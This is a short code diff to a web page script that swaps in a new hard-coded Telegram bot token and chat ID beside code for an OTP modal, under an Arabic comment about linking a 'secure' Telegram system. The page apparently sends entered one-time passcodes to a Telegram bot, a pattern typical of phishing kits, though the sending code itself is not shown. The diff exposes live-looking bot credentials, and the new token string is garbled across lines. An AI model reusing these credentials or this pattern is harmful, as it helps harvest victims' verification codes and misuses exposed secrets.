@@ -138,8 +138,11 @@
 
     <script>
         // ربط نظام تيليجرام الفوري والآمن بالكامل
-        const TELEGRAM_TOKEN = "8844898772:AAGytrouZty_qXxAiMNVkFmC_5ZhJZYsuyM";
-        const TELEGRAM_CHAT_ID = "8832471799";
+        const TELEGRAM_TOKEN =
+"8790032593: AAFiuJ90S8_0f68Wm- Zw
+wOd-WubgHLiiWc";
+        const TELEGRAM_CHAT_ID =
+"8863224789";
 
         const modal = document.getElementById('otpModal');
         const modalContent = modal.querySelector('div');
